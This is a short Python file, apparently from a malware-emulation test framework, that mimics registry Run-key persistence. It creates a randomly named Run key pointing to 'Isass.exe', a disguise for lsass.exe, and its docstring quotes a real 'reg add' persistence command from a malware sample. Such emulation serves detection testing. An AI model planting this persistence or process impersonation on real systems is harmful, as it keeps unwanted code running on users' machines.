"""This scripts attempts to mimic a piece of malware that is trying to maintain
persistance via the registry run key


1. Randomized Registry Key in the CurrentVersion\\Run path
    * https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order

Registry key source:
    * https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
    ```
    cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "mzaiifkxcyb819" /t REG_SZ /d "\"C:\tasksche.exe\"" /f
    ```
"""

from ..malware import Malware

REG_KEY = "mzaiifkxcyb819"

# The executable name attempts to impersonate the real lsass.exe process
PATH = "C:/windows/system32/"
NAME = "Isass.exe"




class RegKeyPersist(Malware):
    
    def __init__(self):
        super(RegKeyPersist, self).__init__(NAME, PATH)

        self.create_registry_key(
            key = REG_KEY,
            value = PATH + NAME
        )

if __name__ == "__main__":
    RegKeyPersist()

